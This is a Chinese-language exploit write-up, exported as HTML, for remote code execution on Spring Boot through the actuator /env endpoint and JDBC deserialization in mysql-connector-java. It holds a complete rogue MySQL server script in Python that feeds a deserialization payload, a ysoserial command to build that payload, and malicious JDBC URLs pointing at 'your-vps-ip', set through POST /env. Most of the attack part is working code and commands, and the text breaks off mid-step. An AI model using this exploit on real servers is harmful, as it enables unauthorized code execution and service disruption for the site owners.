<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.csFE4DF89B{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs92F4F65E{color:#000000;background-color:transparent;font-family:Segoe UI Emoji;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X40ed099a6813521d9e9612265074d9e71a51b5a"><span class="csDE05BCC">Spring Boot mysql jdbc deserialization rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h4 class="cs868C439D">
			<a name="利用条件"><span class="cs6EDCDAE2">利用条件：</span></a></h4>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs1773D91F"><span class="cs9C1B1871">可以</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求目标网站的</span><span class="cs8926E06"> </span><span class="cs9FB05234">/env</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接口设置属性</span></li><li class="cs1773D91F"><span class="cs9C1B1871">可以</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">请求目标网站的</span><span class="cs8926E06"> </span><span class="cs9FB05234">/refresh</span><span class="cs8926E06"> </span><span class="cs9C1B1871">接口刷新配置（存在</span><span class="cs8926E06"> </span><span class="cs9FB05234">spring-boot-starter-actuator</span><span class="cs8926E06"> </span><span class="cs9C1B1871">依赖）</span></li><li class="cs1773D91F"><span class="cs9C1B1871">目标环境中存在</span><span class="cs8926E06"> </span><span class="cs9FB05234">mysql-connector-java</span><span class="cs8926E06"> </span><span class="cs9C1B1871">依赖</span></li><li class="cs1773D91F"><span class="cs9C1B1871">目标可以请求攻击者的服务器（请求可出外网）</span></li></ul>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="csFE4DF89B"><span class="cs8926E06">spring.datasource.url </span><span class="cs9C1B1871">属性被设置为外部恶意</span><span class="cs8926E06"> mysql jdbc url </span><span class="cs9C1B1871">地址</span></li><li class="csFE4DF89B"><span class="cs8926E06">refresh </span><span class="cs9C1B1871">刷新后设置了一个新的</span><span class="cs8926E06"> spring.datasource.url </span><span class="cs9C1B1871">属性值</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">当网站进行数据库查询等操作时，会尝试使用恶意</span><span class="cs8926E06"> mysql jdbc url </span><span class="cs9C1B1871">建立新的数据库连接</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">然后恶意</span><span class="cs8926E06"> mysql server </span><span class="cs9C1B1871">就会在建立连接的合适阶段返回反序列化</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">数据</span></li><li class="csFE4DF89B"><span class="cs9C1B1871">目标依赖的</span><span class="cs8926E06"> mysql-connector-java </span><span class="cs9C1B1871">就会反序列化设置好的</span><span class="cs8926E06"> gadget</span><span class="cs9C1B1871">，造成</span><span class="cs8926E06"> RCE </span><span class="cs9C1B1871">漏洞</span></li></ol>
		<h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<h5 class="cs868C439D">
			<a name="步骤一查看环境依赖"><span class="cs1C2E50E7">步骤一：查看环境依赖</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">GET </span><span class="cs9C1B1871">请求</span><span class="cs8926E06"> </span><span class="cs9FB05234">/env</span><span class="cs8926E06"> </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> </span><span class="cs9FB05234">/actuator/env</span><span class="cs9C1B1871">，搜索环境变量（</span><span class="cs8926E06">classpath</span><span class="cs9C1B1871">）中是否有</span><span class="cs8926E06"> </span><span class="cs9FB05234">mysql-connector-java</span><span class="cs8926E06"> </span><span class="cs9C1B1871">关键词，并记录下其版本号（</span><span class="cs8926E06">5.x </span><span class="cs9C1B1871">或</span><span class="cs8926E06"> 8.x</span><span class="cs9C1B1871">）；</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">搜索并观察环境变量中是否存在常见的反序列化</span><span class="cs8926E06"> gadget </span><span class="cs9C1B1871">依赖，比如</span><span class="cs8926E06"> </span><span class="cs9FB05234">commons-collections</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">Jdk7u21</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">Jdk8u20</span><span class="cs8926E06"> </span><span class="cs9C1B1871">等；</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">搜索</span><span class="cs8926E06"> </span><span class="cs9FB05234">spring.datasource.url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">关键词，记录下其</span><span class="cs8926E06"> </span><span class="cs9FB05234">value</span><span class="cs8926E06"> </span><span class="cs9C1B1871">值，方便后续恢复其正常</span><span class="cs8926E06"> jdbc url </span><span class="cs9C1B1871">值。</span></p><h5 class="cs868C439D">
			<a name="步骤二架设恶意-rogue-mysql-server"><span class="cs1C2E50E7">步骤二：架设恶意</span><span class="cs4B51D5E4"> rogue mysql server</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在自己控制的服务器上运行</span><span class="cs8926E06">springboot-jdbc-deserialization-rce.py</span><span class="cs9C1B1871">脚本，并使用</span><span class="cs8926E06">ysoserial</span><span class="cs9C1B1871">自定义要执行的命令：</span></p><p class="cs3A447A38"><span class="cs9FB05234">springboot-jdbc-deserialization-rce.py</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># coding: utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># -**- Author: LandGrey -**-</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import socket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import binascii</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def server_send(conn, payload):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global count</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;count += 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[*] Package order: {}, Send: {}&quot;.format(count, payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;conn.send(binascii.a2b_hex(payload))</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def server_receive(conn):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global count, BUFFER_SIZE</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;count += 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;data = conn.recv(BUFFER_SIZE)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[*] Package order: {}, Receive: {}&quot;.format(count, data))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return str(data).lower()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def run_mysql_server():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global count, deserialization_payload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn, addr = server_socks.accept()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Connection from client -&gt; {}:{}&quot;.format(addr[0], addr[1]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;greeting = &#39;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, greeting)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if os.path.isfile(deserialization_file):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open(deserialization_file, &#39;rb&#39;) as _f:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deserialization_payload = binascii.b2a_hex(_f.read())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# client auth</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, response_ok)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# client query</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;session.auto_increment_increment&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_payload = &#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, _payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;show warnings&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_payload = &#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, _payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;set names&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, response_ok)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;set character_set_results&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, response_ok)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;show session status&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data = &#39;0100000102&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data += &#39;2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data += &#39;2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_payload_hex = str(hex(len(deserialization_payload)/2)).replace(&#39;0x&#39;, &#39;&#39;).zfill(4)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_payload_length = _payload_hex[2:4] + _payload_hex[0:2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data_hex = str(hex(len(deserialization_payload)/2 + 5)).replace(&#39;0x&#39;, &#39;&#39;).zfill(6)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data_lenght = _data_hex[4:6] + _data_hex[2:4] + _data_hex[0:2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data += _data_lenght + &#39;04&#39; + &#39;0131fc&#39; + _payload_length + deserialization_payload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_data += &#39;07000005fe000022000100&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, _data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = server_receive(conn)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;show warnings&quot; in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_payload = &#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_send(conn, _payload)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conn.close()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;HOST = &quot;0.0.0.0&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;PORT = 3306</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;deserialization_file = r&#39;payload.ser&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if os.path.isfile(deserialization_file):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open(deserialization_file, &#39;rb&#39;) as f:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deserialization_payload = binascii.b2a_hex(f.read())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deserialization_payload = &#39;aced****(your deserialized hex data)&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;count = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;BUFFER_SIZE = 1024</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response_ok = &#39;0700000200000002000000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] rogue mysql server Listening on {}:{}&quot;.format(HOST, PORT))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server_socks.bind((HOST, PORT))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server_socks.listen(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;run_mysql_server()</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://download.0-sec.org/download/ysoserial.zip</span></p><p class="cs3A447A38"><span class="cs9FB05234">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在脚本</span><span class="csE3F655E4">同目录下</span><span class="cs9C1B1871">生成</span><span class="cs8926E06"> </span><span class="cs9FB05234">payload.ser</span><span class="cs8926E06"> </span><span class="cs9C1B1871">反序列化</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">文件，供脚本使用。</span></p><h5 class="cs868C439D">
			<a name="步骤三设置-springdatasourceurl-属性"><span class="cs1C2E50E7">步骤三：设置</span><span class="cs4B51D5E4"> spring.datasource.url </span><span class="cs1C2E50E7">属性</span></a></h5>
		<p class="cs6FD73CFB"><span class="cs92F4F65E">⚠️</span><span class="cs8926E06"> </span><span class="cs9C1B1871">修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</span></p><p class="cs40DD2BC9"><span class="cs8926E06">mysql-connector-java 5.x </span><span class="cs9C1B1871">版本设置</span><span class="csE3F655E4">属性值</span><span class="cs9C1B1871">为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span></p><p class="cs40DD2BC9"><span class="cs8926E06">mysql-connector-java 8.x </span><span class="cs9C1B1871">版本设置</span><span class="csE3F655E4">属性值</span><span class="cs9C1B1871">为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span></p><p class="cs40DD2BC9"><span class="cs8926E06">spring 1.x</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /env</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">spring.datasource.url=</span><span class="cs7FFD2630">对应属性值</span></p><p class="cs40DD2BC9"><span class="cs8926E06">spring 2.x</span></p><p class="cs3A447A38"><span 